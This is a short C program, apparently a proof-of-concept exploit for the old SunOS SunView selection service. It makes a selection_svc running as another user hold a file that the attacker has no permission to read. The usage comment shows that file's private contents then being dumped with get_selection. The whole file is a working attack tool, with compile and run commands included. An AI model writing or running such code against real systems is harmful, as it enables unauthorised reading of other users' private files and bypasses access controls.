/* SELN_HOLD_FILE
 * For use where someone has a selection_svc runnning as them, after an
 * invocation of suntools:
 *
 * % cat their_private_file
 * their_private_file: Permission denied
 * % cc seln_hold_file.c -o seln_hold_file -lsuntool -lsunwindow
 * % ./seln_hold_file their_private_file
 * % get_selection 2
 * < contents of their_private_file >
 * %
 */

#include <stdio.h>
#include <sys/types.h>
#include <suntool/seln.h>

main(argc, argv)
  int argc;
  char *argv[];
{
  Seln_result     ret;

  if (argc != 2) {
    (void) fprintf(stderr, "usage: seln_grab file1\n");
    exit(1);
  }

  ret = seln_hold_file(SELN_SECONDARY, argv[1]);
  seln_dump_result(stdout, &ret);
  printf("\n");
}

/*
 * Local variables:
 * compile-command: "cc -sun3 -Bstatic -o seln_hold_file seln_hold_file.c -lsun
tool -lsunwindow"
 * end:
 *
 * Static required because _mem_ops not included in ld.so
 */
